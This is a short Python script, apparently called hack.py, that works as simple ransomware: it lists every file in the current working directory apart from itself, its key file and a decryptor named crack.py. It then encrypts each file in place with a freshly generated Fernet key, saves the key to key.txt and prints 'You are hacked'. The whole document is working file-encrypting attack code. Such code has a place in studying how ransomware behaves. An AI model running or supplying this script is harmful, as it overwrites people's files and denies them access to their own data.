import os
from cryptography.fernet import Fernet

def get_all_files(dir=os.getcwd()):
	files_list = []
	for i in os.listdir(dir):
		if i=='hack.py' or i=='key.txt' or i=='crack.py':continue
		elif os.path.isfile(i):
			files_list.append(i)
	return files_list

def generate_key():
	_key = Fernet.generate_key()
	with open('key.txt', 'wb') as file:
		file.write(_key)
	return Fernet(_key)

def hack(files_list=[]):
	_key = generate_key()
	for file in files_list:
		with open(file, 'rb') as data:
			temp_data = data.read()
		hashed_data = _key.encrypt(temp_data)
		
		with open(file, 'wb') as _data:
			_data.write(hashed_data)

	return f"\n\t!!!.... You are hacked ....!!!\n"
		
files = get_all_files()
print(hack(files))
